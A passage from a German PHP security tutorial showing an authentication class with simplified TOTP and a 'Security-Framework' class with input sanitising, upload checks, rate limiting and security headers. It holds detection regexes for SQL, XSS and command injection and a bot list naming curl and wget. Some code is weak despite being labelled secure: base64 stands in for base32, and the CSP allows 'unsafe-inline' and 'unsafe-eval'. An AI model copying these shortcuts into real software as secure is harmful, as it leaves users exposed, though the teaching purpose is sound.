        if (isset($_SESSION['ip_address']) && $_SESSION['ip_address'] !== ($_SERVER['REMOTE_ADDR'] ?? 'unknown')) {
            $this->logout();
            throw new SecurityException("Session-Sicherheitsverletzung");
        }
        
        $_SESSION['last_activity'] = time();
    }
    
    /**
     * Zwei-Faktor-Authentifizierung
     */
    public function generateTOTPSecret() {
        return base32_encode(random_bytes(20));
    }
    
    public function verifyTOTP($secret, $code) {
        // TOTP-Algorithmus (vereinfacht)
        $time_step = floor(time() / 30);
        
        // Aktuelle Zeit + 1 Schritt in beide Richtungen prüfen
        for ($i = -1; $i <= 1; $i++) {
            $expected_code = $this->calculateTOTP($secret, $time_step + $i);
            if (hash_equals($expected_code, $code)) {
                return true;
            }
        }
        
        return false;
    }
    
    private function calculateTOTP($secret, $time_step) {
        // Vereinfachte TOTP-Berechnung
        $hash = hash_hmac('sha1', pack('N*', 0, $time_step), base32_decode($secret), true);
        $offset = ord($hash[19]) & 0xf;
        $code = (
            ((ord($hash[$offset + 0]) & 0x7f) << 24) |
            ((ord($hash[$offset + 1]) & 0xff) << 16) |
            ((ord($hash[$offset + 2]) & 0xff) << 8) |
            (ord($hash[$offset + 3]) & 0xff)
        ) % 1000000;
        
        return str_pad($code, 6, '0', STR_PAD_LEFT);
    }
    
    /**
     * Sicherheits-Logging
     */
    private function logSecurityEvent($event, $user_id = null, $additional_data = []) {
        $log_entry = [
            'timestamp' => date('Y-m-d H:i:s'),
            'event' => $event,
            'user_id' => $user_id,
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'additional_data' => $additional_data
        ];
        
        // In echten Anwendungen: In Datenbank oder Log-Datei schreiben
        error_log("SECURITY: " . json_encode($log_entry));
    }
    
    // Hilfsmethoden (würden normalerweise Datenbank-Operationen sein)
    private function userExists($email) { return false; } // Simulation
    private function getUserByEmail($email) { return null; } // Simulation
    private function updatePasswordHash($user_id, $hash) { return true; } // Simulation
    private function clearFailedLogins($email) { return true; } // Simulation
    private function setRememberMeToken($user_id) { return true; } // Simulation
    private function sendVerificationEmail($email, $token) { return true; } // Simulation
    
    private function sanitizeUserData($user) {
        return [
            'id' => $user['id'],
            'email' => $user['email'],
            'created_at' => $user['created_at']
        ];
    }
    
    public function logout() {
        session_unset();
        session_destroy();
        
        // Remember-Me Cookie löschen
        if (isset($_COOKIE['remember_token'])) {
            setcookie('remember_token', '', time() - 3600, '/', '', true, true);
        }
    }
}

// Base32-Hilfs-Funktionen (vereinfacht)
function base32_encode($data) {
    return base64_encode($data); // Vereinfacht
}

function base32_decode($data) {
    return base64_decode($data); // Vereinfacht
}

echo "&lt;div class='alert alert-success'&gt;";
echo "&lt;h6&gt;🔐 Sichere Authentifizierung implementiert:&lt;/h6&gt;";
echo "&lt;ul&gt;";
echo "&lt;li&gt;&lt;strong&gt;Password-Hashing:&lt;/strong&gt; Argon2ID mit hohen Kosten&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Rate-Limiting:&lt;/strong&gt; Brute-Force-Schutz&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Session-Security:&lt;/strong&gt; Sichere Konfiguration&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;2FA-Support:&lt;/strong&gt; TOTP-basierte Zwei-Faktor-Auth&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Security-Logging:&lt;/strong&gt; Alle Ereignisse protokollieren&lt;/li&gt;";
echo "&lt;/ul&gt;";
echo "&lt;/div&gt;";
?&gt;</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <h3>🎮 Großes Praxisbeispiel: Security-Framework</h3>
                        <div class="card mb-4">
                            <div class="card-body">
                                <div class="card bg-dark text-light">
                                    <div class="card-header">
                                        <small><i class="bi bi-shield-fill me-2"></i>Umfassendes Security-Framework für PHP-Anwendungen</small>
                                    </div>
                                    <div class="card-body">
                                        <pre class="mb-0"><code class="language-php text-light">&lt;?php
// Umfassendes Security-Framework
class SecurityFramework {
    
    private $config;
    private $logger;
    private $whitelist;
    private $blacklist;
    
    public function __construct($config = []) {
        $this->config = array_merge([
            'max_request_size' => 10485760, // 10MB
            'max_file_uploads' => 10,
            'allowed_file_types' => ['jpg', 'jpeg', 'png', 'pdf', 'doc', 'docx'],
            'rate_limit_requests' => 1000,
            'rate_limit_window' => 3600,
            'honeypot_enabled' => true,
            'csrf_protection' => true,
            'xss_protection' => true,
            'sql_injection_protection' => true
        ], $config);
        
        $this->logger = new SecurityLogger();
        $this->initializeFilters();
        $this->setupSecurityHeaders();
    }
    
    /**
     * Request-Validierung
     */
    public function validateRequest() {
        // Request-Größe prüfen
        $this->checkRequestSize();
        
        // Rate-Limiting
        $this->checkRateLimit();
        
        // IP-Whitelist/Blacklist
        $this->checkIPRestrictions();
        
        // User-Agent-Prüfung
        $this->checkUserAgent();
        
        // Honeypot-Prüfung
        if ($this->config['honeypot_enabled']) {
            $this->checkHoneypot();
        }
        
        // Input-Validierung
        $this->validateInputs();
        
        return true;
    }
    
    /**
     * Security-Header setzen
     */
    private function setupSecurityHeaders() {
        $headers = [
            'X-Content-Type-Options' => 'nosniff',
            'X-Frame-Options' => 'DENY',
            'X-XSS-Protection' => '1; mode=block',
            'Referrer-Policy' => 'strict-origin-when-cross-origin',
            'Permissions-Policy' => 'camera=(), microphone=(), geolocation=()',
            'Strict-Transport-Security' => 'max-age=31536000; includeSubDomains; preload'
        ];
        
        // Content-Security-Policy
        $csp_rules = [
            "default-src 'self'",
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: https:",
            "connect-src 'self'",
            "font-src 'self' https:",
            "object-src 'none'",
            "media-src 'self'",
            "frame-src 'none'"
        ];
        $headers['Content-Security-Policy'] = implode('; ', $csp_rules);
        
        foreach ($headers as $name => $value) {
            if (!headers_sent()) {
                header("$name: $value");
            }
        }
    }
    
    /**
     * Input-Sanitization und -Validierung
     */
    public function sanitizeInput($input, $type = 'string', $options = []) {
        switch ($type) {
            case 'email':
                $clean = filter_var(trim($input), FILTER_SANITIZE_EMAIL);
                return filter_var($clean, FILTER_VALIDATE_EMAIL) ? $clean : false;
                
            case 'url':
                $clean = filter_var(trim($input), FILTER_SANITIZE_URL);
                return filter_var($clean, FILTER_VALIDATE_URL) ? $clean : false;
                
            case 'int':
                $min = $options['min'] ?? null;
                $max = $options['max'] ?? null;
                $flags = FILTER_FLAG_NONE;
                
                if ($min !== null) $flags |= FILTER_FLAG_RANGE;
                
                $filter_options = [];
                if ($min !== null || $max !== null) {
                    $filter_options['options'] = ['min_range' => $min, 'max_range' => $max];
                }
                
                return filter_var($input, FILTER_VALIDATE_INT, $flags, $filter_options);
                
            case 'float':
                return filter_var($input, FILTER_VALIDATE_FLOAT);
                
            case 'boolean':
                return filter_var($input, FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE) !== null;
                
            case 'html':
                $allowed_tags = $options['allowed_tags'] ?? [];
                if (empty($allowed_tags)) {
                    return strip_tags($input);
                }
                $allowed = '&lt;' . implode('&gt;&lt;', $allowed_tags) . '&gt;';
                return strip_tags($input, $allowed);
                
            case 'filename':
                $clean = preg_replace('/[^a-zA-Z0-9._-]/', '', basename($input));
                return substr($clean, 0, 255);
                
            case 'alphanum':
                return preg_replace('/[^a-zA-Z0-9]/', '', $input);
                
            case 'path':
                $clean = realpath($input);
                $base_path = realpath($options['base_path'] ?? $_SERVER['DOCUMENT_ROOT']);
                
                if (!$clean || strpos($clean, $base_path) !== 0) {
                    return false; // Path-Traversal-Versuch
                }
                return $clean;
                
            default: // string
                $input = trim($input);
                $max_length = $options['max_length'] ?? 1000;
                $input = substr($input, 0, $max_length);
                
                // XSS-Schutz
                if ($this->config['xss_protection']) {
                    $input = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
                }
                
                return $input;
        }
    }
    
    /**
     * SQL-Injection-Schutz
     */
    public function detectSQLInjection($input) {
        $sql_patterns = [
            '/(\s|^)(union|select|insert|update|delete|drop|create|alter|exec|execute)\s/i',
            '/(\s|^)(or|and)\s+[\w\'"]+\s*=\s*[\w\'"]+/i',
            '/(\'|\")(\s|;)*(union|select|insert|update|delete)/i',
            '/\bhex\s*\(/i',
            '/\bchar\s*\(/i',
            '/\bconcat\s*\(/i',
            '/\/\*.*?\*\//s',
            '/--.*$/m',
            '/#.*$/m'
        ];
        
        foreach ($sql_patterns as $pattern) {
            if (preg_match($pattern, $input)) {
                $this->logger->logThreat('sql_injection_attempt', [
                    'input' => $input,
                    'pattern' => $pattern,
                    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
                ]);
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * File-Upload-Security
     */
    public function validateFileUpload($file) {
        if (!isset($file['tmp_name']) || !is_uploaded_file($file['tmp_name'])) {
            throw new SecurityException("Ungültiger Datei-Upload");
        }
        
        // Dateigröße prüfen
        $max_size = $this->config['max_file_size'] ?? 5242880; // 5MB
        if ($file['size'] > $max_size) {
            throw new SecurityException("Datei zu groß");
        }
        
        // Dateiendung prüfen
        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $this->config['allowed_file_types'])) {
            throw new SecurityException("Dateityp nicht erlaubt");
        }
        
        // MIME-Type prüfen
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $file['tmp_name']);
        finfo_close($finfo);
        
        $allowed_mimes = [
            'jpg' => 'image/jpeg',
            'jpeg' => 'image/jpeg',
            'png' => 'image/png',
            'pdf' => 'application/pdf',
            'doc' => 'application/msword',
            'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        ];
        
        if (!isset($allowed_mimes[$extension]) || $allowed_mimes[$extension] !== $mime_type) {
            throw new SecurityException("MIME-Type stimmt nicht mit Dateiendung überein");
        }
        
        // Datei-Header prüfen (Magic Bytes)
        $handle = fopen($file['tmp_name'], 'rb');
        $header = fread($handle, 10);
        fclose($handle);
        
        $magic_bytes = [
            'jpg' => ["\xFF\xD8\xFF"],
            'jpeg' => ["\xFF\xD8\xFF"],
            'png' => ["\x89\x50\x4E\x47"],
            'pdf' => ["%PDF"]
        ];
        
        if (isset($magic_bytes[$extension])) {
            $valid_header = false;
            foreach ($magic_bytes[$extension] as $magic) {
                if (strpos($header, $magic) === 0) {
                    $valid_header = true;
                    break;
                }
            }
            
            if (!$valid_header) {
                throw new SecurityException("Datei-Header ungültig");
            }
        }
        
        // Virus-Scan (falls ClamAV verfügbar)
        if (class_exists('ClamAV')) {
            $clamav = new ClamAV();
            if (!$clamav->scanFile($file['tmp_name'])) {
                throw new SecurityException("Virus gefunden");
            }
        }
        
        return true;
    }
    
    /**
     * Rate-Limiting
     */
    private function checkRateLimit() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $key = 'rate_limit_' . hash('sha256', $ip);
        
        if (!isset($_SESSION[$key])) {
            $_SESSION[$key] = [];
        }
        
        $now = time();
        $window_start = $now - $this->config['rate_limit_window'];
        
        // Alte Requests entfernen
        $_SESSION[$key] = array_filter($_SESSION[$key], function($timestamp) use ($window_start) {
            return $timestamp > $window_start;
        });
        
        // Aktuellen Request hinzufügen
        $_SESSION[$key][] = $now;
        
        // Limit prüfen
        if (count($_SESSION[$key]) > $this->config['rate_limit_requests']) {
            $this->logger->logThreat('rate_limit_exceeded', [
                'ip' => $ip,
                'requests' => count($_SESSION[$key]),
                'limit' => $this->config['rate_limit_requests']
            ]);
            
            http_response_code(429);
            throw new SecurityException("Rate-Limit überschritten");
        }
    }
    
    /**
     * Honeypot-Felder prüfen
     */
    private function checkHoneypot() {
        $honeypot_fields = ['website', 'url', 'homepage', 'link'];
        
        foreach ($honeypot_fields as $field) {
            if (!empty($_POST[$field])) {
                $this->logger->logThreat('honeypot_triggered', [
                    'field' => $field,
                    'value' => $_POST[$field],
                    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
                ]);
                
                // Bot erkannt - Request blockieren
                http_response_code(403);
                throw new SecurityException("Bot-Aktivität erkannt");
            }
        }
    }
    
    /**
     * Eingaben validieren
     */
    private function validateInputs() {
        $dangerous_patterns = [
            // XSS-Versuche
            '/&lt;script[^&gt;]*&gt;.*?&lt;\/script&gt;/is',
            '/javascript:/i',
            '/on\w+\s*=/i',
            
            // SQL-Injection
            '/(\s|^)(union|select|insert|update|delete|drop)\s/i',
            '/(\'|\")(\s|;)*(union|select)/i',
            
            // Command-Injection
            '/[;&|`$(){}[\]]/i',
            '/\b(exec|system|shell_exec|passthru|eval)\s*\(/i',
            
            // Path-Traversal
            '/\.\.[\/\\\\]/i',
            '/[\/\\\\]\.\./i'
        ];
        
        $inputs = array_merge($_GET, $_POST, $_COOKIE);
        
        foreach ($inputs as $key => $value) {
            if (is_string($value)) {
                foreach ($dangerous_patterns as $pattern) {
                    if (preg_match($pattern, $value)) {
                        $this->logger->logThreat('malicious_input_detected', [
                            'key' => $key,
                            'value' => $value,
                            'pattern' => $pattern,
                            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
                        ]);
                        
                        throw new SecurityException("Schädliche Eingabe erkannt");
                    }
                }
            }
        }
    }
    
    /**
     * Request-Größe prüfen
     */
    private function checkRequestSize() {
        $content_length = $_SERVER['CONTENT_LENGTH'] ?? 0;
        
        if ($content_length > $this->config['max_request_size']) {
            throw new SecurityException("Request zu groß");
        }
    }
    
    /**
     * IP-Restriktionen
     */
    private function checkIPRestrictions() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        
        // Blacklist prüfen
        if (isset($this->blacklist['ips']) && in_array($ip, $this->blacklist['ips'])) {
            $this->logger->logThreat('blacklisted_ip_blocked', ['ip' => $ip]);
            http_response_code(403);
            throw new SecurityException("IP-Adresse blockiert");
        }
        
        // Whitelist prüfen (falls aktiv)
        if (isset($this->whitelist['ips']) && !empty($this->whitelist['ips'])) {
            if (!in_array($ip, $this->whitelist['ips'])) {
                $this->logger->logThreat('non_whitelisted_ip_blocked', ['ip' => $ip]);
                http_response_code(403);
                throw new SecurityException("IP-Adresse nicht autorisiert");
            }
        }
    }
    
    /**
     * User-Agent-Prüfung
     */
    private function checkUserAgent() {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        // Leerer User-Agent (verdächtig)
        if (empty($user_agent)) {
            $this->logger->logThreat('empty_user_agent', [
                'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
            ]);
            // Warnung, aber nicht blockieren
        }
        
        // Bekannte Bot-Patterns
        $bot_patterns = [
            '/bot/i', '/crawler/i', '/spider/i', '/scraper/i',
            '/curl/i', '/wget/i', '/python/i', '/ruby/i'
        ];
        
        foreach ($bot_patterns as $pattern) {
            if (preg_match($pattern, $user_agent)) {
                $this->logger->logThreat('bot_detected', [
                    'user_agent' => $user_agent,
                    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
                ]);
                // Je nach Policy: blockieren oder durchlassen
                break;
            }
        }
    }
    
    /**
     * Filter initialisieren
     */
    private function initializeFilters() {
        // Blacklist bekannter schädlicher IPs/User-Agents
        $this->blacklist = [
            'ips' => [
                // Beispiel-IPs (in echter Anwendung aus Datenbank laden)
                '192.168.1.100', '10.0.0.50'
            ],
            'user_agents' => [
                'BadBot/1.0', 'Scraper/2.0'
            ]
        ];
        
        // Whitelist vertrauensvoller IPs
        $this->whitelist = [
            'ips' => [
                // Admin-IPs, vertrauensvolle Partner
            ]
        ];
    }
    
    /**
     * Security-Report generieren
     */
    public function generateSecurityReport() {
        $threats = $this->logger->getThreats();
        $stats = [];
        
        foreach ($threats as $threat) {
            $type = $threat['type'];
            if (!isset($stats[$type])) {
                $stats[$type] = 0;
            }
            $stats[$type]++;
        }
        
        return [
            'total_threats' => count($threats),
            'threat_types' => $stats,
            'recent_threats' => array_slice($threats, -10),
            'top_threat_ips' => $this->getTopThreatIPs($threats)
        ];
    }
    
    private function getTopThreatIPs($threats) {
        $ip_counts = [];
        
        foreach ($threats as $threat) {
            $ip = $threat['data']['ip'] ?? 'unknown';
            if (!isset($ip_counts[$ip])) {
                $ip_counts[$ip] = 0;
            }
            $ip_counts[$ip]++;
        }
        
        arsort($ip_counts);
        return array_slice($ip_counts, 0, 10, true);
    }
}

// Security-Logger
class SecurityLogger {
    private $log_file = 'security.log';
    private $threats = [];
    
    public function logThreat($type, $data) {
        $entry = [
            'timestamp' => date('Y-m-d H:i:s'),
            'type' => $type,
            'data' => $data
        ];
        
        $this->threats[] = $entry;
        
        // In Datei schreiben
        $log_line = json_encode($entry) . PHP_EOL;
        file_put_contents($this->log_file, $log_line, FILE_APPEND | LOCK_EX);
        
        // Bei kritischen Bedrohungen: sofort benachrichtigen
        if ($this->isCriticalThreat($type)) {
            $this->sendAlert($entry);
        }
    }
    
    private function isCriticalThreat($type) {
        $critical_types = [
            'sql_injection_attempt',
            'rate_limit_exceeded',
            'malicious_input_detected'
        ];
        
        return in_array($type, $critical_types);
    }
    
    private function sendAlert($entry) {
        // E-Mail, Slack, etc. (vereinfacht)
        error_log("CRITICAL SECURITY THREAT: " . json_encode($entry));
    }
    
    public function getThreats($limit = 100) {
        return array_slice($this->threats, -$limit);
    }
}

// Security-Framework verwenden
try {
    $security = new SecurityFramework([
        'max_request_size' => 5242880, // 5MB
        'rate_limit_requests' => 100,
        'honeypot_enabled' => true
    ]);
    
    // Request validieren
    $security->validateRequest();
    
    // Eingaben sicher verarbeiten
    $username = $security->sanitizeInput($_POST['username'] ?? '', 'string', ['max_length' => 50]);
    $email = $security->sanitizeInput($_POST['email'] ?? '', 'email');
    $age = $security->sanitizeInput($_POST['age'] ?? '', 'int', ['min' => 13, 'max' => 120]);
    
    echo "&lt;div class='alert alert-success'&gt;Request erfolgreich validiert und Eingaben bereinigt!&lt;/div&gt;";
    
    // Security-Report
    $report = $security->generateSecurityReport();
    echo "&lt;div class='alert alert-info'&gt;";
    echo "&lt;h6&gt;🛡️ Security-Report:&lt;/h6&gt;";
    echo "Bedrohungen gesamt: " . $report['total_threats'] . "&lt;br&gt;";
    if (!empty($report['threat_types'])) {
        echo "Bedrohungstypen: " . implode(', ', array_keys($report['threat_types']));
    }
    echo "&lt;/div&gt;";
    
} catch (SecurityException $e) {
    http_response_code(403);
    echo "&lt;div class='alert alert-danger'&gt;Sicherheitsfehler: " . $e->getMessage() . "&lt;/div&gt;";
} catch (Exception $e) {
    http_response_code(500);
    echo "&lt;div class='alert alert-danger'&gt;Systemfehler aufgetreten&lt;/div&gt;";
}

class SecurityException extends Exception {}

echo "&lt;div class='alert alert-success mt-4'&gt;";
echo "&lt;h6&gt;🏆 Vollständiges Security-Framework implementiert:&lt;/h6&gt;";
echo "&lt;ul&gt;";
echo "&lt;li&gt;&lt;strong&gt;Request-Validierung:&lt;/strong&gt; Größe, Rate-Limiting, IP-Filter&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Input-Sanitization:&lt;/strong&gt; XSS-, SQL-Injection-, Command-Injection-Schutz&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;File-Upload-Security:&lt;/strong&gt; MIME-Type, Magic-Bytes, Virus-Scan&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Security-Headers:&lt;/strong&gt; CSP, HSTS, X-Frame-Options&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Threat-Detection:&lt;/strong&gt; Honeypots, Pattern-Matching&lt;/li&gt;";
echo "&lt;li&gt;&lt;strong&gt;Security-Logging:&lt;/strong&gt; Umfassende Überwachung und Alerts&lt;/li&gt;";
echo "&lt;/ul&gt;";
echo "&lt;/div&gt;";
?&gt;</code></pre>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="alert alert-success">
                            <h5><i class="bi bi-shield-check me-2"></i>Security - Die wichtigsten Erkenntnisse</h5>
                            <ul class="mb-0">
                                <li>✅ <strong>Defense in Depth</strong> - Mehrschichtige Sicherheit</li>
                                <li>✅ <strong>Input-Validierung</strong> - Niemals Benutzereingaben vertrauen</li>
                                <li>✅ <strong>Output-Encoding</strong> - XSS durch Escaping verhindern</li>
                                <li>✅ <strong>CSRF-Schutz</strong> - Tokens für alle Formular-Aktionen</li>
                                <li>✅ <strong>Sichere Authentifizierung</strong> - Starke Passwörter, 2FA, Rate-Limiting</li>
                                <li>✅ <strong>Security-Headers</strong> - Browser-seitige Schutzmaßnahmen</li>
                                <li>✅ <strong>Monitoring & Logging</strong> - Angriffe erkennen und protokollieren</li>
                            </ul>
                        </div>

                        <div class="row">
                            <div class="col-md-4">
                                <div class="card">
                                    <div class="card-body text-center">
                                        <h6>Vorheriges Thema</h6>
                                        <a href="php-err.php" class="btn btn-outline-secondary">
                                            <i class="bi bi-arrow-left me-2"></i>Error Handling
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="card bg-success">
                                    <div class="card-body text-center text-white">
                                        <h6>🎉 Tutorial Komplett!</h6>
                                        <p class="mb-0">Sie haben alle 25 PHP-Themen gemeistert!</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="card">
                                    <div class="card-body text-center">
                                        <h6>Zur Übersicht</h6>
                                        <a href="php-index.php" class="btn btn-outline-secondary">
                                            <i class="bi bi-house me-2"></i>PHP Hauptseite
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </main>
    </div>
</div>

<?php include $_SERVER['DOCUMENT_ROOT'] . '/includes/footer.php'; ?>